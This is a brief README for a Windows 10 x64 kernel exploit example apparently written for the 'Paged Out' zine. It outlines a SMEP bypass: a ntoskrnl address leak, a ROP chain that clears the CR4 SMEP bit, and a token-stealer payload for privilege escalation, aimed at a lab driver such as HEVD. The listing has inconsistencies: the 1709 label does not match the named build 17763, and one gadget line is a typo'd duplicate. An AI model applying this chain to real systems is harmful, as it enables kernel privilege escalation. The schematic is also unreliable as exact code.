# WindowsSMEPBypass
Example of SMEP bypass in Windows 10 1709 x64 for Paged Out.

# Brief description

Vulnerability: Stack based overflow in a third-party driver.

1. **Leak ntoskrnl address**
    - *NtQuerySystemInformation*
2. **Setup payload**
    - *ROP Chain*: We use only gadgets in ntoskrnl. Exactly, ntoskrnl *10.0.17763.678*
						
						pop rcx (1)
						ptr_userland_memory
						nt!KiSaveInitialProcessorControlState
						mov rax, dword [rcx+0x18] (2)
						pop rcx (1)
						0xFFFFFFFFFFEFFFFF
						and ecx, eax (3)
						mov cr4, ecx (4)
						OFFSET TOKEN STEALER
						mov cr4. ecx (4)
						ret (5)
						
						
		
		

    - *Payload*: We want to elevate our privileges, so our payload is Token Stealer. It is in payload.asm
3. **Trigger vuln**
    - *DeviceIoControl*

# Important

You need a vulnerable driver to test this. You can make your own or find some vulnerable. You can check HEVD(Hacksys Extreme Vulnerable Driver).
